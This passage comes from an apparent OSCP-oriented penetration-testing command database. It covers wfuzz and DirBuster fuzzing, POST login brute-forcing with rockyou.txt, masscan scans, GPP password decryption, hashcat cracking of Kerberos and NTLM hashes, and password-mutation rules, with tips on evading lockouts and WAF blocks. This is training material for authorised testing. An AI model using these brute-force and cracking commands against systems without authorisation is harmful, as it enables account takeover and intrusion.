- Use CLI alternatives for efficiency

RECOMMENDED OSCP ALTERNATIVES:
- wfuzz:
Full-featured CLI fuzzing
- ffuf:
Fast fuzzing with advanced filtering
- hydra:
Authentication brute-forcing
- Custom Python/Bash scripts for specific attacks","low","","","","","","","[""wfuzz-params"", ""ffuf-param-fuzz"", ""wfuzz-dir""]",""
"burp-scanner","Burp Suite Scanner - Automated Vulnerability Detection","web","N/A - GUI-based tool (Professional only)","Automated web vulnerability scanner built into Burp Suite Professional","","","Burp Scanner is a Professional-only feature for automated vulnerability detection.

MANUAL STEPS (Burp Suite Professional):
1.

Passive scanning (automatic):
   - Browse application with Burp Proxy enabled
   - Scanner automatically detects issues in proxied traffic
   - Review Dashboard  Issue activity

2.

Active scanning:
   - Right-click request/URL in Proxy/Target
   - Select 'Scan' or 'Do active scan'
   - Configure scan settings:
     * Crawl depth and speed
     * Audit checks (SQLi, XSS, etc.)
     * Insertion points

3.

Review findings:
   - Target tab  Site map  Issues
   - Sort by severity (Critical, High, Medium, Low, Info)
   - Click issue for details:
     * Description
     * Proof of concept request/response
     * Remediation advice

4.

Manual verification:
   - Send issue to Repeater for testing
   - Verify exploitability
   - Document true positives

COMMON FINDINGS:
- SQL injection
- Cross-site scripting (XSS)
- OS command injection
- Path traversal
- XML external entity (XXE)
- Server-side request forgery (SSRF)

OSCP EXAM NOTES:
- Burp Scanner (Professional) NOT available in exam
- Community Edition lacks active scanning
- Manual testing required for exam

RECOMMENDED OSCP ALTERNATIVES:
- Manual testing with Burp Repeater (available in Community)
- nikto:
Automated web vulnerability scanner
- sqlmap:
SQL injection detection and exploitation
- Manual payload testing for XSS, LFI, RCE
- ZAP (OWASP Zed Attack Proxy) - open-source alternative","low","","","","","","","[""nikto-scan"", ""sqlmap-basic"", ""wfuzz-params""]",""
"wfuzz-z-file","Wfuzz - File-Based Wordlist Fuzzing","web","wfuzz -z file,<WORDLIST> -u <URL>","Web fuzzing using file-based wordlist with FUZZ keyword placeholder","","wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.45.100/FUZZ","COMMON WORDLISTS:
- /usr/share/seclists/Discovery/Web-Content/common.txt (4,700 entries)
- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt (220k entries)
- /usr/share/seclists/Discovery/Web-Content/big.txt (20k entries)
- /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt (parameters)
- /usr/share/wordlists/rockyou.txt (passwords)

FILTERING OPTIONS:
--hc/--sc:
Hide/show HTTP status codes
--hl/--sl:
Hide/show response lines
--hw/--sw:
Hide/show response words
--hh/--sh:
Hide/show response chars (size)

EXAMPLE COMMANDS:
Directory fuzzing:
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u http://target/FUZZ

Parameter fuzzing:
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 -u 'http://target/page.php?FUZZ=test'

POST login brute-force:
wfuzz -z file,/usr/share/wordlists/rockyou.txt --hc 200 -d 'username=admin&password=FUZZ' -u http://target/login.php

Multiple FUZZ points:
wfuzz -z file,users.txt -z file,passwords.txt -u http://target/login.php -d 'user=FUZZ&pass=FUZ2Z'","high","","","","{""All 404 responses"": ""Add --hc 404 to hide 404s, or verify target URL is correct"", ""Rate limiting detected"": ""Add --delay <seconds> between requests: wfuzz -z file,<WORDLIST> --delay 1 -u <URL>"", ""No results found"": ""Try different wordlist or extensions: -z file,<WORDLIST> -u http://target/FUZZ.txt,.php,.html""}","{""-z"": ""Payload source specification. Format: -z <type>,<source>. 'file' type loads payloads from wordlist file. Alternative types: range (1-100), list (inline values)"", ""-u"": ""Target URL with FUZZ keyword marking injection point. FUZZ is replaced by each wordlist entry. Multiple FUZZ keywords supported for complex fuzzing"", ""file,<WORDLIST>"": ""Specifies file-based payload source. Reads one payload per line from wordlist. Supports absolute/relative paths""}","","[""ffuf-dir-fuzz"", ""gobuster-dir"", ""wfuzz-params""]",""
"wfuzz-post-login-brute","Wfuzz - POST Login Brute Force","web","wfuzz -z file,<WORDLIST> --hc <FAIL_CODE> -d '<POST_DATA>' -u <URL>","Brute-force web login forms using POST requests with response filtering","","wfuzz -z file,/usr/share/wordlists/rockyou.txt --hc 200 -d 'username=admin&password=FUZZ' -u http://192.168.45.100/wp-login.php","WORKFLOW:
1.

Capture login POST request:
   - Open browser dev tools  Network tab
   - Submit login form with test credentials
   - Right-click POST request  Copy  Copy as cURL
   - Extract POST data field names

2.

Identify failure pattern:
   - Test with wrong password:
curl -X POST -d 'user=admin&pass=wrong' http://target/login.php
   - Note status code (usually 200) and failure message ('Invalid password')

3.

Run wfuzz:
   - Filter by failure string:
--hs 'Invalid'
   - OR filter by status if success redirects:
--hc 200 (hide 200, show 302)

4.

Successful login characteristics:
   - Status 302 (redirect to dashboard)
   - Set-Cookie header (session established)
   - Different response length
   - Success message in body

EXAMPLES:
WordPress brute-force:
wfuzz -z file,/usr/share/wordlists/rockyou.txt --hs 'incorrect' -d 'log=admin&pwd=FUZZ' http://target/wp-login.php

Custom form with failure message:
wfuzz -z file,passwords.txt --hs 'Login failed' -d 'username=admin&password=FUZZ&submit=Login' http://target/login.php

Filter by redirect (success = 302):
wfuzz -z file,passwords.txt --hc 200,404 -d 'user=admin&pass=FUZZ' http://target/auth.php

TIPS:
- Always test manually first to understand response patterns
- Use small wordlist initially to verify filtering works
- Add --delay to avoid account lockout/WAF blocking
- Some forms require additional fields (CSRF token, remember-me checkbox)","high","","","","{""All requests hidden"": ""Wrong status code filter. Try --hs 'Invalid' to filter by failure message instead"", ""Account locked out"": ""Add --delay 3 between requests, reduce wordlist size, or use hydra with -t 1 for single thread"", ""CSRF token required"": ""Wfuzz doesn't handle CSRF automatically. Use custom script or Burp Suite for token-based forms""}","{""-z file,<WORDLIST>"": ""Payload source - loads passwords from wordlist file"", ""--hc"": ""Hide responses with specific HTTP status code. Use when failed logins return consistent status (e.g., 200 with error message). Alternative: --hs to hide by response content string"", ""-d"": ""POST data to send with each request. FUZZ keyword replaced by wordlist entries. Capture actual form field names from browser (inspect login form or use Burp)"", ""-u"": ""Target URL endpoint that processes login POST request""}","","[""hydra-http-post-form"", ""ffuf-param-fuzz"", ""burp-intruder""]",""
"dirbuster","DirBuster - GUI Directory Brute-Forcing","web","N/A - GUI-based tool (deprecated)","Java-based GUI directory and file brute-forcing tool (deprecated, use gobuster/ffuf instead)","","","DirBuster is a legacy Java GUI tool for directory brute-forcing.

DEPRECATED and no longer maintained.

MANUAL STEPS (if required for legacy systems):
1.

Launch DirBuster:
   - Command:
java -jar /usr/share/dirbuster/DirBuster-1.0-RC1.jar
   - Or from Kali menu:
Applications  Web Application Analysis  dirbuster

2.

Configure target:
   - Target URL:
http://192.168.45.100/
   - Number of threads:
10-20 (adjust based on target stability)

3.

Select scan type:
   - List based brute force (recommended):
Uses wordlist
   - Pure brute force:
Generates all combinations (extremely slow)

4.

Select wordlist:
   - Browse to wordlist location
   - Recommended:
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
   - Or use Seclists:
/usr/share/seclists/Discovery/Web-Content/common.txt

5.

Configure file extensions:
   - Check 'File extension' box
   - Add extensions:
php,txt,html,asp,aspx,jsp
   - Based on identified technology stack

6.

Start scan:
   - Click 'Start'
   - Monitor 'Results - Tree View' tab for found directories
   - Check 'Results - List View' for all responses

7.

Analyze results:
   - Green = 200 OK (success)
   - Yellow = 403 Forbidden (exists but restricted)
   - Look for interesting directories:
admin, backup, config, uploads

OSCP EXAM NOTES:
- DirBuster is DEPRECATED - use CLI alternatives
- GUI tools slow and inefficient for exam
- No longer pre-installed on modern Kali versions
- CLI tools (gobuster, ffuf) significantly faster

WHY DEPRECATED:
- Java-based (slow, resource intensive)
- No longer maintained by OWASP
- Superseded by faster CLI tools
- GUI not practical for exam time constraints

RECOMMENDED OSCP ALTERNATIVES:
- gobuster:
Fast, efficient, CLI-based (preferred)
- ffuf:
Very fast fuzzing with advanced filtering
- wfuzz:
Feature-rich web fuzzing
- dirb:
Older CLI alternative (slower than gobuster)

EQUIVALENT COMMANDS:
DirBuster scan = gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

MIGRATION GUIDE:
DirBuster Setting  Gobuster Equivalent
- Target URL  gobuster -u <URL>
- Wordlist  gobuster -w <WORDLIST>
- Extensions  gobuster -x <EXTENSIONS>
- Threads  gobuster -t <THREADS>
- Exclude status codes  gobuster -b <CODES>","low","","","","","","","[""gobuster-dir"", ""ffuf-dir-fuzz""]",""
"masscan-full-tcp","Masscan - Full TCP Port Scan","recon","sudo masscan -p1-65535 <TARGET> --rate=<RATE> -e <INTERFACE> --router-ip <GATEWAY>","Ultra-fast TCP port scanner capable of scanning entire internet in minutes","","sudo masscan -p1-65535 192.168.45.100 --rate=1000 -e tun0 --router-ip 10.10.14.1","SPEED VS ACCURACY:
- Masscan prioritizes speed over accuracy
- Very high rates (>10000) may miss ports due to packet loss
- Use nmap for service detection after masscan identifies open ports
- Masscan = fast port discovery, nmap = detailed enumeration

COMMON WORKFLOWS:
1.

Quick discovery:
   sudo masscan -p1-65535 192.168.45.0/24 --rate=1000

2.

Focused scan:
   sudo masscan -p80,443,8080,8443 192.168.45.100 --rate=10000

3.

Full scan with output:
   sudo masscan -p1-65535 192.168.45.100 --rate=1000 -oG results.txt -e tun0 --router-ip 10.10.14.1

4.

Scan subnet:
   sudo masscan -p1-65535 192.168.45.0/24 --rate=5000 --exclude 192.168.45.1

OUTPUT FORMATS:
-oL:
List format
-oG:
Greppable (recommended)
-oJ:
JSON
-oX:
XML (nmap compatible)

RATE GUIDELINES:
- 100:
Very slow, extremely stealthy
- 1000:
Safe default for most networks
- 10000:
Fast, may trigger IDS
- 100000:
Very fast, high packet loss risk
- 1000000:
Extreme speed, unreliable results

VPN USAGE (OSCP):
1.

Find interface:
ip a | grep tun
2.

Find gateway:
ip route | grep tun0
3.

Command:
sudo masscan -p1-65535 <TARGET> --rate=1000 -e tun0 --router-ip 10.10.14.1

VS NMAP:
- Masscan:
Fast port discovery (minutes for all ports)
- Nmap:
Slow but accurate, service detection, scripting
- Best practice:
masscan for discovery  nmap for enumeration","medium","","","","{""FAIL: failed to detect IP"": ""Add -e <INTERFACE> --router-ip <GATEWAY> explicitly"", ""permission denied"": ""Run with sudo (required for raw sockets)"", ""rate too high causes missed ports"": ""Reduce --rate to 500 or 1000"", ""No results found"": ""Verify target is reachable: ping <TARGET>""}","{""-p1-65535"": ""Port range to scan (all TCP ports). Can specify specific ports: -p80,443,8080 or ranges: -p1-1000"", ""--rate"": ""Packet transmission rate in packets per second. Controls scan speed. 1000 = safe for most networks, 10000+ = very fast but may cause network issues or trigger IDS"", ""-e"": ""Network interface to use. Required when multiple interfaces exist. Use 'ip a' to list available interfaces. VPN typically tun0/tap0"", ""--router-ip"": ""Gateway router IP for packet routing. Required for VPN connections. Find with 'ip route show' or 'route -n'"", ""sudo"": ""Required for raw socket access (SYN scanning). Masscan must run as root""}","","[""nmap-port-check"", ""nmap-service-scan""]",""
"smb-share-windows-list","List SMB Shares (Windows CLI)","enumeration","ls \\<TARGET>\<SHARE>","List contents of remote SMB share using Windows command prompt","smb-enumeration","ls \\192.168.1.50\C$","Windows-style UNC path.

Requires authentication to target.

Use 'dir' for more details.

Common shares:
C$, ADMIN$, IPC$.

From Linux:
smbclient //target/share","high","","","","","","","",""
"gpp-decrypt-python-script","GPP Password Decryption Script","enumeration","python gpp-decrypt.py <CPASSWORD>","Decrypt Group Policy Preferences cPassword attribute using known AES key","credential-extraction","python gpp-decrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ","Group Policy Preferences vulnerability (MS14-025).

AES key published by Microsoft.

Python script:
gpp-decrypt.

PowerShell:
Get-GPPPassword.

cPassword found in SYSVOL XML files.","high","","","","","","","[""get-gpppassword""]",""
"ps-get-domain-dn-format","Convert Domain to Distinguished Name","enumeration","$env:USERDNSDOMAIN | ForEach-Object { 'DC=' + ($_ -replace '\.',',DC=') }","Convert current domain FQDN to LDAP Distinguished Name format","ldap-queries","","PowerShell one-liner to convert domain.local to DC=domain,DC=local format.

Useful for constructing LDAP queries.

Example:
corp.local becomes DC=corp,DC=local.

Required for many AD LDAP operations.","medium","","","","","","","",""
"hashcat-kerberos-aes256-cbc","Hashcat Kerberos AES256-CBC Mode","enumeration","hashcat -m 22921 -a 0 <HASH_FILE> <WORDLIST>","Crack Kerberos AES256-CBC hashes (not aes-256-ctr)","password-cracking","hashcat -m 22921 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt","Mode 22921 is for AES256-CBC specifically, NOT aes-256-ctr.

For AS-REP roasting.

Different from -m 19700 (Kerberos TGS-REP).

Obtained via Rubeus, GetNPUsers.py, or similar tools.","medium","","","","","{""-m 22921"": ""Hash mode for Kerberos 5 AS-REP AES256-CBC (specific cipher mode)"", ""-a 0"": ""Attack mode 0 (straight/dictionary attack)""}","","",""
"manual-hash-generation-loop","Manual Password Hash Generation","enumeration","for pw in $(cat <WORDLIST>); do echo -n ""$pw"" | md5sum; done","Generate MD5 hashes for wordlist manually using shell loop (educational/fallback)","password-cracking","for pw in $(cat wordlist.txt); do echo -n ""$pw"" | md5sum; done","Bash one-liner for educational purposes or when hashcat/john unavailable.

Extremely slow compared to dedicated tools.

Change md5sum to sha1sum, sha256sum, etc.

for other algorithms.

Not recommended for production use.","low","","","","","","","[""john-show-cracked""]",""
"calculate-keyspace","Calculate Password Keyspace","enumeration","python3 -c ""import math; charset=<CHARSET_SIZE>; length=<PASSWORD_LENGTH>; print(f'Keyspace: {charset**length:,} combinations')""","Calculate total number of possible passwords for brute-force","","python3 -c ""import math; charset=62; length=8; print(f'Keyspace: {charset**length:,} combinations')""","OSCP TIP:
Keyspace determines brute-force feasibility.

Common charsets:
Lowercase (a-z) = 26, Upper+Lower (A-Za-z) = 52, Alphanumeric (A-Za-z0-9) = 62, Full printable ASCII = 95.

Example:
8-char alphanumeric = 62^8 = 218,340,105,584,896 (218 trillion).

At 1 billion H/s (fast GPU on MD5) = 218,340 seconds = 60 hours.

At 10 H/s (bcrypt) = 692 YEARS.

Conclusion:
Brute-force only viable for:
Fast hashes (MD5, NTLM) + Short passwords (<8 chars) OR Slow hashes + Dictionary attacks.","high","","","","","{""charset**length"": ""Exponential calculation - Each position has 'charset' possibilities. 8-char password with 62 chars = 62^8 = 218 trillion combinations. Formula: keyspace = charset_size ^ password_length. Example charsets: lowercase (26), upper+lower (52), alphanumeric (62), +special chars (95). Keyspace grows exponentially with length - 8 chars = 218T, 9 chars = 13.5 quadrillion (62x larger)."", ""python3 -c"": ""Execute Python one-liner - Useful for complex calculations in terminal. Alternative: Use calculator, Excel, or dedicated keyspace tools. Math: Lower charset + longer password often EASIER than higher charset + shorter password (8-char alphanumeric vs 6-char full ASCII).""}","","[""hash-rate-benchmark""]","[""attack-mode-decision"", ""hashcat-mask-attack""]"
"calculate-crack-time","Estimate Password Cracking Time","enumeration","python3 -c ""keyspace=<KEYSPACE>; hash_rate=<HASH_RATE>; seconds=keyspace/hash_rate; hours=seconds/3600; print(f'Time: {hours:.2f} hours ({hours/24:.2f} days)')""","Calculate estimated time to crack based on keyspace and hash rate","","python3 -c ""keyspace=218340105584896; hash_rate=1000000000; seconds=keyspace/hash_rate; hours=seconds/3600; print(f'Time: {hours:.2f} hours ({hours/24:.2f} days)')""","OSCP TIP:
Decision tree - Time estimate < 1 hour:
Proceed with brute-force.

1-4 hours:
Consider if exam time allows.

4-24 hours:
Only if overnight + not time-critical.

>24 hours:
Use dictionary/rule attacks instead.

Reality check:
Average crack time = 50% of maximum (but could be 1% or 99% - random).

Hash rate varies:
GPU temp, power limits, other processes.

Always add 20% safety margin to estimates.","high","","","","","{""keyspace/hash_rate"": ""Time calculation - Divide total combinations by processing speed. Result = seconds to test every combination. On average, crack at 50% (but plan for 100% worst case). Example: 218T combinations \u00f7 1B H/s = 218,340 seconds = 60 hours. Formula assumes: 1) No duplicate tests, 2) Constant hash rate, 3) 100% GPU utilization."", ""seconds/3600"": ""Convert to hours - Seconds \u00f7 3600 = hours. Hours \u00f7 24 = days. Provides intuitive time estimate. Example: 218,340 seconds = 60.6 hours = 2.5 days. OSCP context: >4 hours = Not viable during exam. >1 day = Offline-only (post-exam analysis).""}","[""hashcat-benchmark"", ""calculate-keyspace""]","",""
"attack-mode-decision","Choose Attack Mode Strategy","enumeration","echo 'Attack Mode Decision Tree:\n1. Straight Wordlist (fastest, try first)\n2. Wordlist + Rules (best balance)\n3. Combinator (merge wordlists)\n4. Mask Attack (known pattern)\n5. Brute Force (last resort)'","Display attack mode selection strategy","","","OSCP TIP:
Attack mode selection based on intelligence.

SCENARIO 1:
No policy known  Try:
rockyou.txt (straight), rockyou.txt + best64.rule, rockyou.txt + rockyou-30000.rule.

SCENARIO 2:
Policy known (8 chars, 1 upper, 1 digit, 1 special)  Create targeted rules:
c $<YEAR> $! applied to company/season wordlist.

SCENARIO 3:
Pattern observed (firstname+year format)  Use mask:
?u?l?l?l?l?l?l?l?d?d?d?d.

Time allocation (exam):
Straight wordlist (5 min), Rule-based (30-60 min), Mask/Brute-force (only if <2 hours estimated).","high","","","","","{""Decision Tree"": ""Attack progression - Start FAST (straight wordlist), escalate to SMART (rules), end with SLOW (brute-force). Order by: Time efficiency + Success probability. Don't skip straight wordlist - 10-15% success rate in 1-5 minutes. Each mode targets different password creation patterns: Dictionary = human-chosen words, Rules = human variations, Mask = known policy, Brute-force = random/unknown.""}","[""hashid"", ""calculate-keyspace""]","","[""hashcat-crack"", ""john-crack"", ""hydra-ssh""]"
"wordlist-effectiveness","Estimate Wordlist Effectiveness","enumeration","wc -l <WORDLIST> && echo 'With rules: ' && python3 -c ""lines=<LINE_COUNT>; rules=<RULE_COUNT>; print(f'{lines * rules:,} total candidates')""","Calculate total candidates from wordlist + rules combination","","wc -l /usr/share/wordlists/rockyou.txt && echo 'With rules: ' && python3 -c ""lines=14344391; rules=64; print(f'{lines * rules:,} total candidates')""","OSCP TIP:
Wordlist selection based on scenario.

OSCP exam common:
rockyou.txt (generic passwords, high success rate).

Corporate pentest:
Company-specific wordlist (company name, products, locations, employee names).

Web app:
Leaked DB from similar service.

Size vs.

Success:
Bigger  Always better.

Targeted 1,000-word list + good rules > Generic 14M list (faster, focused).

Create custom:
grep '<COMPANY>' /usr/share/wordlists/* > company.txt; Add:
seasons, years, common patterns.","medium","","","","","{""wc -l"": ""Count wordlist lines - Each line = one base password. rockyou.txt = 14,344,391 words. Smaller lists: common-passwords.txt (10k-100k), company-specific (100-1000 words). Line count \u00d7 rule count = total candidates tested."", ""lines * rules"": ""Multiplication factor - Each rule multiplies wordlist size. 14M words \u00d7 64 rules = 896M candidates. Larger rulesets: rockyou-30000.rule (14M \u00d7 30,000 = 420 BILLION candidates). Trade-off: More rules = more coverage + more time.""}","","",""
"hash-rate-benchmark","Benchmark Hash Cracking Speed","enumeration","hashcat -b -m <MODE> | grep -A3 'Hashmode:'","Measure hash rate for specific hash type on current system","","hashcat -b -m 1000 | grep -A3 'Hashmode:'","OSCP TIP:
Benchmark reveals reality.

Example results (NVIDIA RTX 3080):
MD5 (-m 0) = 50 GH/s (50 billion/sec), NTLM (-m 1000) = 80 GH/s, SHA256 (-m 1400) = 20 GH/s, bcrypt (-m 3200) = 100 kH/s (100 thousand/sec), KeePass (-m 13400) = 10 H/s.

Implications:
MD5 8-char alphanumeric brute-force = 1 hour.

KeePass same password = 69,000 YEARS.

Conclusion:
Hash algorithm choice matters MORE than password length for slow hashes.

Always benchmark before committing time.","high","","","","","{""-b"": ""Benchmark mode - Test hash cracking speed on current hardware (CPU/GPU). Runs short test, displays hashes per second (H/s). Results vary by: GPU model, CPU speed, temperature, power settings. Use to: 1) Estimate crack time, 2) Compare hash algorithms, 3) Detect hardware issues (low H/s = thermal throttling)."", ""-m <MODE>"": ""Hash type - Different algorithms have vastly different speeds. Fast hashes (MD5, NTLM): Billions H/s. Slow hashes (bcrypt, scrypt, Argon2): Hundreds/thousands H/s. Benchmark ACTUAL target hash type (don't estimate from MD5 if cracking bcrypt)."", ""grep -A3"": ""Filter output - Benchmark shows ALL hash types by default (100+ lines). -A3 shows 3 lines AFTER match. Shows: Hash type name, Speed, Time. Alternative: Redirect full output: hashcat -b > benchmark.txt""}","[""hashcat-benchmark""]","[""calculate-keyspace""]","[""attack-mode-decision"", ""hashcat-mask-attack""]"
"session-management","Manage Long-Running Crack Sessions","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> --session=<SESSION_NAME> -o <OUTPUT_FILE> --outfile-format=2","Run cracking session with named session and output file","","hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt --session=exam-target1 -o cracked.txt --outfile-format=2","OSCP TIP:
Session management critical for exam.

Scenario:
Cracking KeePass hash (slow, hours needed).

Start session:
hashcat --session=keepass-crack ....

Pause (Ctrl+C), work on other machines.

Resume later:
hashcat --session=keepass-crack --restore.

Hashcat resumes EXACTLY where it stopped (no wasted work).

Check progress anytime:
hashcat --session=keepass-crack --status (shows ETA, speed, candidates tested).

Output file benefits:
1) Persist cracked passwords, 2) Share results between tools, 3) Documentation for report.","medium","","","","","{""--session"": ""Session name - Allows pause/resume. Hashcat saves progress automatically. Resume: hashcat --session=<NAME> --restore. View status: hashcat --session=<NAME> --status. Checkpoint file: <SESSION_NAME>.restore (don't delete during run). Essential for: Long attacks, exam scenarios (need to pivot to other tasks), power outages."", ""-o"": ""Output file - Save cracked passwords to file (don't rely on terminal output). Format: hash:password (by default). Multiple runs append (don't overwrite). Alternative: Check hashcat.potfile (~/.hashcat/hashcat.potfile) - stores ALL cracked hashes permanently."", ""--outfile-format"": ""Output format - Controls output file format. 2 = plain password only (no hash). Formats: 1=hash:password, 2=password, 3=hash, 4=hex_plain, 5=hex_plain:password. Use 2 for clean password list (ready for spraying, SSH login, etc.).""}","","",""
"monitor-crack-progress","Monitor Cracking Progress","enumeration","watch -n 5 'hashcat --session=<SESSION_NAME> --status 2>&1 | grep -E ""Progress|Speed|Recovered|Time""'","Real-time monitoring of hashcat session progress","","watch -n 5 'hashcat --session=exam-target1 --status 2>&1 | grep -E ""Progress|Speed|Recovered|Time""'","OSCP TIP:
Monitoring prevents wasted time.

Check 5 minutes after start:
Speed stable? (yes = good, fluctuating = thermal issues).

Progress moving? (yes = working, 0% frozen = error).

ETA reasonable? (yes = continue, >exam time = abort).

Example:
Started bcrypt crack, estimated 48 hours.

After 5 min check:
ETA still 48 hours = abort, try different attack.

Monitoring also detects:
GPU crashes (Speed = 0), wrong hash format (Rejected 100%), completed sessions (Progress = 100%).","medium","","","","","{""watch -n 5"": ""Refresh every 5 seconds - The watch command reruns command at interval. -n 5 = update every 5 seconds. Provides real-time dashboard of crack progress. Alternative intervals: -n 1 (faster updates, more CPU), -n 60 (slower, less intrusive). Ctrl+C to exit watch."", ""--status"": ""Status query - Display current session statistics WITHOUT attaching to interactive session. Shows: Progress (%), Speed (H/s), Recovered (cracked count), Time (started, ETA). Non-blocking: Doesn't interrupt running session. Alternative: Press 's' during interactive hashcat session (shows inline status)."", ""grep -E 'Progress|Speed|Recovered|Time'"": ""Filter key metrics - Status output verbose (20+ lines). Grep extracts important lines only. Metrics: Progress (% complete, X/Y candidates tested), Speed (current H/s), Recovered (cracked/total), Time.Estimated (ETA).""}","","",""
"optimize-crack-performance","Optimize Hashcat Performance","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -w 3 -O --force","Run hashcat with performance optimization flags","","hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -w 3 -O --force","OSCP TIP:
Performance optimization matters for time-constrained scenarios.

Baseline:
hashcat -m 1000 hash.txt rockyou.txt (default, ~40 GH/s).

Optimized:
Same + -w 3 -O (~55 GH/s, 37% faster).

On 1-hour crack = save 20 minutes.

Monitoring optimization:
Watch GPU usage (nvidia-smi or radeontop).

Target:
95-100% GPU util, 70-80C temp.

If:
<80% GPU = increase -w, >90C = reduce -w (thermal throttling).

Other optimizations:
Close background apps, use -d 1,2 for multi-GPU, update GPU drivers.","medium","","","","","{""-w 3"": ""Workload profile - Controls GPU utilization. Levels: 1=Low (desktop usable), 2=Default (balanced), 3=High (GPU maxed, desktop laggy), 4=Nightmare (100% GPU, system unusable). Use -w 3 for: Dedicated cracking (no GUI needed), overnight sessions, maximum speed. Use -w 1/2 for: Working while cracking, GPU shared with display."", ""-O"": ""Optimized kernel - Enable performance kernel (faster but limited). Constraint: Max password length reduced (typically 31 chars \u2192 15 chars). Trade-off: 20-30% speed increase for short passwords. Safe assumption: Most real passwords <15 chars. Disable -O if: Cracking long passphrases, No speed improvement seen."", ""--force"": ""Force execution despite warnings - Bypass driver/hardware warnings. Use when: Running in VM, Non-standard GPU, OpenCL errors. CAUTION: May cause crashes/instability. Only use if: Default run shows warnings but you understand risks.""}","","",""
"ps-get-current-domain","PowerShell Get Current Domain Information","enumeration","[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()","Retrieve current Active Directory domain information using .NET System.DirectoryServices.ActiveDirectory","ACTIVE_DIRECTORY","","","","[{""command"": ""[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"", ""description"": ""Get comprehensive domain information (name, forest, domain controllers, etc.)"", ""context"": ""Initial AD environment reconnaissance""}, {""command"": ""([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name"", ""description"": ""Extract just the domain name (e.g., corp.local)"", ""context"": ""Quick domain name verification""}, {""command"": ""([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers | Select-Object Name,IPAddress"", ""description"": ""List all domain controllers with their names and IP addresses"", ""context"": ""DC discovery for targeting""}, {""command"": ""([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name"", ""description"": ""Identify Primary Domain Controller (PDC) - highest value target"", ""context"": ""High-value target identification""}, {""command"": ""([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Forest.Name"", ""description"": ""Get forest name (useful for multi-domain environments)"", ""context"": ""Forest topology mapping""}]","{""purpose"": ""Quick domain information gathering using built-in .NET classes - no tools, no file uploads, minimal detection footprint"", ""manual_alternative"": ""PowerView: Get-Domain | Import-Module PowerView.ps1 required)"", ""common_failures"": [""Not on domain-joined machine - method requires domain authentication context"", ""Network connectivity issues to domain controller"", ""Returns object - must access properties (.Name, .DomainControllers, etc.) for specific values""], ""when_to_use"": [""First step after gaining access to domain-joined Windows workstation"", ""Before lateral movement - identify domain controllers and PDC"", ""When you need domain context without importing PowerView"", ""OSCP exam initial AD enumeration phase""], ""exam_relevance"": ""HIGH - Immediate domain awareness without tool uploads. Essential first command on domain-joined hosts."", ""time_estimate"": ""<5 seconds"", ""technical_notes"": [""Returns System.DirectoryServices.ActiveDirectory.Domain object"", ""Automatically uses current user's domain credentials"", ""Provides: Domain name, Forest name, DC list, FSMO role holders"", ""PDC (Primary Domain Controller) is often highest-value target for attacks"", ""DomainControllers property returns collection of DC objects with Name/IPAddress/OSVersion""]}","[""ps-ldap-directorysearcher"", ""ps-get-group-members-basic"", ""powerview-get-domain""]","","","[""evil-winrm-shell""]","[""powerview-get-netdomain""]","[""get-aduser"", ""powerview-get-netuser-all"", ""ldapsearch-ad""]"
"rule-append-digit","Append Single Digit Rule","enumeration","echo '$[0-9]' > <RULE_FILE>","Create rule to append digits 0-9 to passwords","","echo '$[0-9]' > append-digit.rule","OSCP TIP:
Rule syntax - $ (append), ^ (prepend), c (capitalize), r (reverse), d (duplicate), t (toggle case).

Combine operators:
c $1 (Capitalize + append 1)  password  Password1.

Test rules:
john --wordlist=words.txt --rules --stdout > mutated.txt.

Each operator creates separate mutations - 1 word with 10 $[0-9] rules = 10 passwords.","high","","","","","{""$[0-9]"": ""Append character - The $ operator appends the following character to the end of the word. [0-9] is character class notation - creates 10 rules (one for each digit). Password \u2192 Password0, Password1, ... Password9. Common pattern: users add single digit to comply with password policies.""}","","[""rule-capitalize-append"", ""rule-prepend-year""]","[""hashcat-test-rules"", ""john-test-rules""]"
"rule-prepend-year","Prepend Year Rule","enumeration","echo '^2 ^0 ^2 ^4' > <RULE_FILE>","Create rule to prepend year (e.g., 2024) to passwords","","echo '^2 ^0 ^2 ^4' > prepend-year.rule","OSCP TIP:
Prepend operators stack right-to-left.

For 2024:
^4 adds '4' first, ^2 adds '2' before it (24), ^0 adds '0' (024), final ^2 adds '2' (2024).

Alternative years:
2023 = ^3 ^2 ^0 ^2, 2025 = ^5 ^2 ^0 ^2.

Combine with other rules:
^2 ^0 ^2 ^4 c (Prepend 2024 AND capitalize)  password  2024Password.

Common corporate pattern:
YYYYpassword! or password!YYYY.","high","","","","","{""^"": ""Prepend character - The ^ operator prepends characters to the START of the word. Applied RIGHT-TO-LEFT: ^4 ^2 ^0 ^2 reads as ^4 first (adds 4 to start), then ^2 (adds 2 before 4), etc. Final result: 2024password. Common in corporate environments (current year prefix for password rotation).""}","","[""rule-append-digit"", ""create-policy-rules""]","[""hashcat-test-rules"", ""john-test-rules""]"
"rule-capitalize-append","Capitalize + Append Special Char Rule","enumeration","echo 'c $!' > <RULE_FILE>","Create rule to capitalize first letter and append exclamation mark","","echo 'c $!' > cap-special.rule","OSCP TIP:
Multi-operator rules combine effects.

c $! transforms 'password'  'Password!'.

Common corporate password policy:
8+ chars, 1 uppercase, 1 special char.

Users modify existing passwords minimally:
password  Password!, welcome  Welcome!, spring2024  Spring2024!.

Test multiple special chars:
c $!, c $@, c $#, c $$.

Priority testing order:
